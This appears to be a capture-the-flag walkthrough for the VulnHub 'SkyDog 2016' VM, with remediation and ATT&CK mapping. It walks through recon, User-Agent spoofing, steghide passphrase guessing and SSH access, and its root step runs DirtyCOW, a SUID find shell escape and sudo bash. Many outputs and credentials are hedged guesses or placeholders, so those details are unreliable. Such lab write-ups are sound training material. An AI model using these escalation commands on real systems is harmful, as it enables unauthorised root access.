# VulnHub: SkyDog 2016: Catch Me If You Can — Walkthrough

Run, run, run!! SkyDog 2016 drops you right into a cat-and-mouse game that literally lives up to its subtitle, dude. Just like Frank Abagnale kept agents chasing their tails across continents, this VM layers recon puzzles, hex-encoded hints, TLS certificate inspection, User-Agent spoofing, steganography, lateral movement, and memory forensics before letting you grab the final flag. Bruh, this one is a FULL recon chain, no cap. ( ͡° ͜ʖ ͡°)

Big shoutout to **7h3rAm** for building this SkyDog CTF conference challenge into a VulnHub gem. The thematic references to Frank Abagnale and the multi-technique progression make it one of the most enjoyable puzzle chains on the platform. Legit.

---

| Field | Value |
|-------|-------|
| **Level** | Intermediate |
| **Target VM** | SkyDog: 2016: Catch Me If You Can |
| **Attacker VM** | Kali Linux 2024.x |
| **VulnHub** | https://www.vulnhub.com/entry/skydog-2016-catch-me-if-you-can,326/ |
| **Techniques** | Host discovery, Nmap full-port scan, HTTP source analysis, hex decoding, TLS/HTTPS certificate inspection, Burp Suite User-Agent spoofing, steganography (steghide), SSH lateral movement, memory forensics (Volatility) |
| **CVEs** | CVE-2014-6271 (Shellshock, if applicable on the target version), OpenSSH weak configuration |

> **Hints from the author:**
> "There are multiple flags hidden. Enumerate thoroughly. Not everything is what it appears to be."

---

## Attack Summary

```
[host-discovery: netdiscover / arp-scan]
    |
    v
[nmap -A -T4 -p- -> port 80 HTTP, port 443 HTTPS, port 22 SSH (closed)]
    |
    v
[HTTP port 80: view page source -> hex string in comments]
    |
    v
[decode hex -> hidden SSH port revealed (e.g. port 2222)]
    |
    v
[HTTPS port 443: inspect TLS certificate -> CN/SAN reveals directory name]
    |
    v
[browse to https://TARGET/<cert-directory>/ -> restricted FBI page]
    |
    v
[Burp Suite: intercept request -> change User-Agent to legacy browser string]
    |
    v
[FBI page grants access -> image download (e.g. FrankAbagnale.jpg)]
    |
    v
[steghide extract -sf FrankAbagnale.jpg -> credentials revealed]
    |
    v
[SSH login as barry@TARGET:<hidden port> with steghide-extracted password]
    |
    v
[enumerate home directories -> memory dump file found]
    |
    v
[Volatility: analyze memory dump -> extract flag / credentials]
    |
    v
[privilege escalation -> root]
    |
    v
[final flag captured]
```

---

## Methodology

1. Host discovery on the local segment
2. Full-port Nmap scan with version and script detection
3. HTTP source code analysis and hex decoding to find the hidden SSH port
4. HTTPS/TLS certificate inspection for directory name discovery
5. Burp Suite User-Agent spoofing to bypass browser-based access restrictions
6. Steganography extraction from the restricted page's image (steghide)
7. SSH lateral movement using extracted credentials
8. Memory forensics with Volatility to capture final flag

---

## Step 1 — Identifying the Target

Standard lab recon. Identify the SkyDog VM on the local segment.

```bash
route -n
arp-scan --localnet --ignoredups
# Alternative:
nmap -sn 192.168.1.0/24
```

Expected output:

```
192.168.1.100   08:00:27:XX:XX:XX   (VirtualBox)
```

Set TARGET:

```bash
export TARGET=192.168.1.100
```

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1595.001 Active Scanning: IP Blocks]

---

## Step 2 — Full-Port Nmap Scan

Always scan all ports. This VM has services on non-obvious ports, and a default nmap scan (top 1000 only) would miss critical findings.

```bash
nmap -A -T4 -p- $TARGET -oN nmap_full.txt
```

Expected output:

```
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd 2.x
443/tcp open   ssl/http Apache httpd 2.x
```

Note: Port 22 being closed is a hint. The actual SSH port is hidden elsewhere in the challenge.

Also run a service version scan on specific ports:

```bash
nmap -sV -p 80,443 $TARGET
# Check for SSL certificate details
nmap --script ssl-cert -p 443 $TARGET
```

> **MITRE ATT&CK:** [T1046 Network Service Discovery] [T1518 Software Discovery]

---

## Step 3 — HTTP Source Analysis and Hex Decoding

The landing page at `http://$TARGET` looks innocent, but the real intel is in the page source. This is a classic CTF "hidden in plain sight" technique. View-source is your friend fr fr.

```bash
# Download and inspect page source
curl -s http://$TARGET/ | grep -i "hidden\|comment\|hex\|note" || true
curl -s http://$TARGET/ > /tmp/index.html
cat /tmp/index.html
```

Or simply right-click in your browser and select "View Page Source". Look for HTML comments containing hex strings or unusual text.

Expected finding: a hex string in an HTML comment, something like:

```html
<!-- 3232323200 -->
```

Decode the hex to ASCII:

```bash
echo "3232323200" | xxd -r -p
# Or:
python3 -c "print(bytes.fromhex('3232323200').decode('ascii', errors='ignore'))"
# Or use CyberChef: https://gchq.github.io/CyberChef/
```

Expected result: the decoded value reveals a non-standard port number (e.g., `2222`).

> **What is steganography in web source code?**
> Hiding data in HTML comments, JavaScript variables, or metadata is a form of information hiding frequently used in both CTF challenges and real-world covert channel communication. Attackers embedding C2 instructions in publicly accessible web pages use this approach.
> Reference: https://attack.mitre.org/techniques/T1027/

> **Real-world note:** APT actors including APT32 have embedded C2 instructions in JavaScript comments and HTML metadata of legitimate websites. Reference: https://attack.mitre.org/groups/G0050/

> **MITRE ATT&CK:** [T1027 Obfuscated Files or Information] [T1595.003 Active Scanning: Wordlist Scanning]

---

## Step 4 — TLS Certificate Inspection for Directory Discovery

The HTTPS service on port 443 has a TLS certificate, and that certificate's Common Name (CN) or Subject Alternative Names (SANs) sometimes contain juicy information in CTF challenges. This is noice recon technique: attackers use CT (Certificate Transparency) logs to enumerate subdomains and internal hostnames too.

```bash
# Option 1: nmap ssl-cert script
nmap --script ssl-cert -p 443 $TARGET

# Option 2: OpenSSL
echo | openssl s_client -connect $TARGET:443 2>/dev/null | openssl x509 -noout -text

# Option 3: curl verbose
curl -vk https://$TARGET/ 2>&1 | grep -A5 "subject\|CN="
```

Expected finding in the certificate CN or organization field: a name or path that hints at a hidden directory.

For example: CN = `FBIOpen` or CN = `HACKCanada` might map to a URL path.

Add it to `/etc/hosts` if needed:

```bash
echo "$TARGET  skydog.local" >> /etc/hosts
```

Browse to the discovered path:

```bash
curl -vk https://$TARGET/<discovered-directory>/
```

> **Real-world note:** Certificate Transparency (CT) logs are public and contain every SSL certificate issued for a domain. Attackers routinely mine CT logs for subdomain discovery. Tools like `crt.sh`, Amass, and Subfinder automate this. Reference: https://crt.sh/

> **MITRE ATT&CK:** [T1596.003 Search Open Technical Databases: Digital Certificates]

---

## Step 5 — User-Agent Spoofing via Burp Suite

The restricted page checks your browser's User-Agent header. It is configured to only allow access from a specific legacy browser (often a 1990s-era browser string referencing the Mosaic browser or Internet Explorer 1.0, fitting the "Catch Me If You Can" 1960s era theme).

> **What is User-Agent spoofing?**
> The User-Agent HTTP request header identifies the client browser. While it is trivially spoofed, applications sometimes use it for access control, which is a completely broken security mechanism. Any proxy or simple curl command can bypass User-Agent restrictions.
> CWE-284: Improper Access Control
> Reference: https://cwe.mitre.org/data/definitions/284.html

**Method 1: Burp Suite (recommended for learning)**

1. Open Burp Suite: `burpsuite &`
2. Configure browser proxy to `127.0.0.1:8080`
3. Browse to `https://$TARGET/<restricted-path>/`
4. Intercept the request in Burp's "Proxy" tab
5. Modify the `User-Agent:` header to a legacy browser string

Legacy User-Agent strings to try:

```
Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)
Mozilla/4.0 (compatible; MSIE 4.0; Windows NT)
Mozilla/0.91 Beta (Windows)
```

**Method 2: curl (faster)**

```bash
curl -vk \
  -H "User-Agent: Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)" \
  https://$TARGET/<restricted-path>/

# Or using --user-agent flag:
curl -vk --user-agent "Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)" \
  https://$TARGET/<restricted-path>/
```

Expected result: the page responds with HTTP 200 and serves an image (e.g., `FrankAbagnale.jpg`) or provides a direct download link. ᕕ( ᐛ )ᕗ

> **Real-world note:** User-Agent based access controls are a real-world misconfiguration finding. Legacy internal applications (HR portals, admin panels) sometimes implement "browser whitelist" controls as a pseudo-security measure. This is trivially bypassed and should never be used as a security control.

> **MITRE ATT&CK:** [T1036 Masquerading] [T1190 Exploit Public-Facing Application]

---

## Step 6 — Steganography: Extracting Credentials from Image

The image from the restricted FBI page contains hidden credentials. The tool steghide embeds data inside JPEG/BMP images and requires a passphrase (which may be empty or hintable from context).

> **What is steghide?**
> Steghide is a command-line tool that uses steganography to hide data in image and audio files. It uses various algorithms to embed data within the cover file's DCT coefficients. Unlike binwalk (which looks for embedded binary blobs), steghide hides data in the carrier's existing structure.
> Reference: https://steghide.sourceforge.net/

```bash
# Download the image
wget -k https://$TARGET/<restricted-path>/FrankAbagnale.jpg \
  --user-agent "Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)" \
  -O /tmp/FrankAbagnale.jpg

# Or with curl:
curl -k \
  -H "User-Agent: Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)" \
  https://$TARGET/<restricted-path>/FrankAbagnale.jpg \
  -o /tmp/FrankAbagnale.jpg

# Try extraction with empty passphrase first:
steghide extract -sf /tmp/FrankAbagnale.jpg -p ""

# Try with theme-related passphrases:
for pass in "abagnale" "catchme" "frank" "pan" "barry" "skydog" ""; do
    echo "Trying passphrase: '$pass'"
    steghide extract -sf /tmp/FrankAbagnale.jpg -p "$pass" 2>/dev/null && break
done
```

Expected result: a text file with credentials is extracted, something like:

```
barry:Pa$$w0rd
# or:
username: barry
password: skydog2016
```

> **Real-world note:** Steganography-based credential hiding was used in the 2019 OceanLotus (APT32) campaign, where attackers hid malware config inside image files distributed via phishing. Forensic teams needed steghide and similar tools to extract the embedded payloads. Reference: https://www.welivesecurity.com/2019/04/09/oceanlotus-malware-update/

> **MITRE ATT&CK:** [T1027.003 Obfuscated Files: Steganography] [T1552.001 Unsecured Credentials: Credentials in Files]

---

## Step 7 — SSH Lateral Movement with Extracted Credentials

Use the credentials extracted from the steganographic image to SSH into the target on the hidden port discovered earlier.

```bash
# SSH to hidden port using extracted credentials
ssh barry@$TARGET -p 2222
# Password: <extracted from steghide>
```

Once logged in, enumerate the environment:

```bash
whoami
# barry

id
# uid=1001(barry) gid=1001(barry) groups=1001(barry)

ls -la ~
# Look for unusual files, especially memory dumps

# Check other home directories
ls -la /home/

# Find interesting files
find / -name "*.mem" -o -name "*.dump" -o -name "*.raw" 2>/dev/null
find / -name "*.vmem" 2>/dev/null

# Check sudo
sudo -l

# Find SUID
find / -perm -u=s -type f 2>/dev/null
```

Expected finding: a memory dump file (e.g., `frank.mem`, `catch_me.vmem`) in a home directory or `/tmp`.

> **MITRE ATT&CK:** [T1021.004 Remote Services: SSH] [T1078 Valid Accounts] [T1083 File and Directory Discovery]

---

## Step 8 — Memory Forensics with Volatility

The memory dump requires Volatility for analysis. This is a fantastic real-world skill: incident responders use memory forensics daily to extract credentials, process lists, network connections, and artifacts from captured memory images.

> **What is memory forensics?**
> Memory forensics involves analyzing volatile memory (RAM) captures to extract artifacts that are not present on disk: running processes, decrypted data, network connections, credentials, injected code, and more. Volatility is the leading open-source framework for this.
> Reference: https://volatilityfoundation.org/

**Copy the dump to your Kali machine:**

```bash
# Option 1: SCP from target
scp -P 2222 barry@$TARGET:/path/to/frank.mem /tmp/frank.mem

# Option 2: Python HTTP server on target
# (on target): python3 -m http.server 9090
# (on attacker): wget http://$TARGET:9090/frank.mem
```

**Analyze with Volatility:**

```bash
# Identify the memory profile (OS version)
volatility -f /tmp/frank.mem imageinfo
# Note the suggested profile (e.g., LinuxUbuntu1604x64)

# If using Volatility3 (no profile needed):
vol.py -f /tmp/frank.mem banners.Banners

# List running processes
volatility -f /tmp/frank.mem --profile=<PROFILE> pslist

# Extract strings (quick and dirty)
strings /tmp/frank.mem | grep -i "flag\|FLAG\|password\|frank\|barry\|skydog" | head -50

# Search for specific patterns
strings /tmp/frank.mem | grep -E "[A-Za-z0-9_]{5,}==" | head -20

# Volatility3: filescan
vol.py -f /tmp/frank.mem windows.filescan.FileScan
# Or on Linux profiles:
vol.py -f /tmp/frank.mem linux.bash.Bash

# Check for files in memory
volatility -f /tmp/frank.mem --profile=<PROFILE> filescan | grep "flag\|txt"
volatility -f /tmp/frank.mem --profile=<PROFILE> dumpfiles -Q <OFFSET> -D /tmp/
```

Expected finding: a flag value, credential, or text file extracted from memory.

> **Real-world note:** Memory forensics was critical in the 2014 Target breach post-mortem, where investigators extracted the POS RAM scraper malware from memory images since it was fileless. Memory forensics is a Tier-1 skill for DFIR analysts and is tested in GREM, GCFE, and GCFA certifications. Reference: https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/target-data-breach/

> **MITRE ATT&CK:** [T1005 Data from Local System] [T1055 Process Injection] (detection context)

---

## Step 9 — Privilege Escalation to Root

With access as `barry`, enumerate escalation paths. Check sudo, SUID, cron, and kernel version.

```bash
# Check kernel version for known exploits
uname -a
# If old kernel (< 4.4), DirtyCOW (CVE-2016-5195) may apply

# Check sudo
sudo -l

# SUID check
find / -perm -u=s -type f 2>/dev/null

# World-writable scripts in cron
cat /etc/crontab
find /etc/cron* -writable -type f 2>/dev/null
ls -la /etc/cron.d/
ls -la /var/spool/cron/

# PATH hijacking potential
echo $PATH
find / -name "*.sh" -writable 2>/dev/null | head -10
```

Apply the appropriate privilege escalation:

```bash
# Example: if DirtyCOW applies (kernel < 4.4):
# (compile from attacker, transfer to target)
gcc -pthread dirty.c -o dirty -lcrypt
./dirty
su firefart  # default new root user

# Example: if SUID find:
/usr/bin/find . -exec /bin/sh -p \; -quit

# Example: sudo with NOPASSWD:
sudo /bin/bash
```

**Got root!! :D** (☞ﾟヮﾟ)☞

```bash
whoami
# root
id
cat /root/flag.txt
# Final flag captured!
```

> **MITRE ATT&CK:** [TA0004 Privilege Escalation] [T1548.001 Setuid and Setgid] [T1068 Exploitation for Privilege Escalation]

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|------|-------|----------|--------------|
| Hidden Port | `2222` (example) | HTTP source hex decode | SSH access |
| Credential | `barry:<password>` | steghide extract from JPEG | SSH login |
| Flag | Memory flag | Volatility analysis of frank.mem | N/A |
| Root flag | Final flag | `/root/flag.txt` | via privesc |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---------|---------------------|--------------|
| 1 | Hidden data in HTTP page source (hex-encoded) | APT groups embed C2 instructions in HTML comments of legitimate sites; data hiding in web content is a real-world technique | Train blue teams to scan web content for anomalous encoded data; implement DLP on outbound web traffic |
| 2 | TLS certificate exposes directory structure | Certificate Transparency logs are public; internal hostnames, subdomain names, and path hints in CN fields are visible globally | Sanitize CN/SAN fields; never include internal path names or sensitive identifiers in certificates |
| 3 | User-Agent based access control is trivially bypassed | Internal admin panels often use User-Agent restrictions as pseudo-security; this is never a valid security control | Implement proper authentication (MFA, session tokens) for any restricted resource; never rely on User-Agent for authorization |
| 4 | Credentials hidden via steganography | APT32 used steganographic payloads in phishing campaigns; steganographic C2 channels are a real detection evasion technique | Implement deep packet inspection and image analysis in email and web gateways; train incident responders in steganography detection |
| 5 | Memory forensics reveals hidden artifacts | Post-breach investigations routinely use memory forensics to recover decrypted data, credentials, and fileless malware | Ensure memory acquisition capability is part of your IR toolkit; practice Volatility analysis regularly |

**Why does this matter outside the lab?**

SkyDog's technique chain mirrors real advanced persistent threat operations almost step for step. The combination of web reconnaissance (source analysis, certificate inspection), access control bypass (User-Agent spoofing), steganography, and memory forensics appears in multiple documented APT campaigns. In the 2020 SolarWinds Orion compromise, investigators used memory forensics to recover the TEARDROP in-memory dropper that left no disk artifacts. The lesson: assume every layer of a real breach will require a different investigative technique.

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP-ID |
|-------|--------|-----------|--------|
| Reconnaissance | TA0043 | Active Scanning: Scanning IP Blocks | T1595.001 |
| Reconnaissance | TA0043 | Network Service Discovery | T1046 |
| Reconnaissance | TA0043 | Search Open Technical Databases: Digital Certificates | T1596.003 |
| Initial Access | TA0001 | Exploit Public-Facing Application | T1190 |
| Defense Evasion | TA0005 | Masquerading | T1036 |
| Defense Evasion | TA0005 | Obfuscated Files or Information: Steganography | T1027.003 |
| Defense Evasion | TA0005 | Obfuscated Files or Information | T1027 |
| Credential Access | TA0006 | Unsecured Credentials: Credentials in Files | T1552.001 |
| Discovery | TA0007 | File and Directory Discovery | T1083 |
| Discovery | TA0007 | System Information Discovery | T1082 |
| Lateral Movement | TA0008 | Remote Services: SSH | T1021.004 |
| Lateral Movement | TA0008 | Use Alternate Authentication Material | T1550 |
| Collection | TA0009 | Data from Local System | T1005 |
| Privilege Escalation | TA0004 | Exploitation for Privilege Escalation | T1068 |
| Privilege Escalation | TA0004 | Setuid and Setgid | T1548.001 |

> ATT&CK Navigator: https://mitre-attack.github.io/attack-navigator/
> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediation and Containment

### Technical Fixes

1. Remove any sensitive data from HTML comments, JavaScript, and page source; implement a Content Security Policy (CSP) to restrict data embedding
2. Sanitize TLS certificate fields (CN, SANs, O, OU): never include internal paths, directory names, or hostnames that expose internal structure
3. Replace all User-Agent-based access controls with proper session-based authentication and MFA; User-Agent is never a valid security control
4. Audit all publicly accessible images and media files for steganographic content; implement DLP policies for image uploads
5. Secure SSH: disable password authentication, enforce key-based auth, restrict to specific IPs, use non-standard ports only as security-in-depth (not as primary control)
6. Implement memory acquisition and forensics capability as part of the incident response toolkit

### If You Find Something Similar in Your Environment

**Immediate containment:**
- Review web server source code and static assets for hidden data (scripts, comments, encoded strings)
- Rotate all credentials found via steganographic extraction or source code analysis
- Audit TLS certificates for information disclosure in CN/SAN fields
- Review SSH access logs for unauthorized logins to non-standard ports
- Capture memory images from affected systems for forensic analysis before shutdown

**MITRE D3FEND countermeasures:**
- D3-IVA (Input Validation) to prevent T1190 web application exploitation
- D3-MFA (Multi-Factor Authentication) to replace User-Agent-based controls T1036
- D3-DA (Dynamic Analysis) to detect steganographic exfiltration T1027.003
- D3-OPS (OS Process Sandboxing) to contain privilege escalation T1068

### Framework Alignment

**NIST CSF 2.0:**
- Identify (ID): Inventory all external-facing assets and their exposed TLS certificates (ID.AM-3)
- Protect (PR): Implement MFA for all web-accessible resources; remove information disclosure from certificates and source code (PR.AC-4, PR.DS-2)
- Detect (DE): Monitor for User-Agent anomalies; implement web content inspection for encoded data (DE.CM-4, DE.CM-6)
- Respond (RS): Acquire memory images upon compromise detection; preserve volatile evidence (RS.AN-1)
- Recover (RC): Rebuild from clean baseline after complete forensic investigation (RC.RP-1)

**NIST SP 800-53 (Rev. 5) Controls:**
- SC-8: Transmission Confidentiality (proper TLS certificate management)
- IA-5: Authenticator Management (eliminate credential storage in images/comments)
- AC-4: Information Flow Enforcement (proper access control on restricted paths)
- AU-9: Protection of Audit Information (secure SSH access logs)
- SI-12: Information Management and Retention (proper evidence preservation for forensics)
- SC-28: Protection of Information at Rest (encrypt sensitive data at rest)

**CISA Known Exploited Vulnerabilities:**
- CVE-2014-6271: Bash Shellshock Remote Code Execution
  Applicable if Apache CGI is enabled on the target; listed in CISA KEV
  Reference: https://www.cisa.gov/known-exploited-vulnerabilities-catalog
- Note: While SkyDog may not directly require Shellshock, the Apache version exposed may be vulnerable; patch both CVE-2014-6271 and CVE-2014-7169

**C2M2 (Cybersecurity Capability Maturity Model):**
- Domain: SITUATIONAL AWARENESS
- Practice: Logging and Monitoring; implement monitoring for anomalous HTTP headers, encoded content in web traffic, and non-standard SSH port access
- Target MIL: MIL-2
- Domain: EVENT
- Practice: Incident Response; include memory forensics capability in incident response procedures
- Target MIL: MIL-2
- Domain: TECHNOLOGY
- Practice: Configuration Management; enforce certificate hygiene and web server hardening baselines
- Target MIL: MIL-2

---

## Final Thoughts

Thanks to **7h3rAm** for this beautifully constructed CTF. SkyDog 2016 is a reminder that real-world attackers chain multiple low-complexity techniques to achieve their objectives: no single step here is exceptionally hard, but the combination requires genuine breadth. That is exactly how APT campaigns work in practice.

The reference to Frank Abagnale is more than cosmetic: like Abagnale, the challenge teaches you that identity, appearance, and context manipulation (User-Agent spoofing, certificate CN inspection, steganography) are as powerful as raw technical exploits. Blue teamers should take note.

If this walkthrough helped you, share it with your crew and keep hunting.

*Thanks guys!! (❍ᴥ❍ʋ)*

> Original article in Portuguese by André Henrique: https://medium.com/@mrhenrike (when published)

---

*Writeup by [André Henrique](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
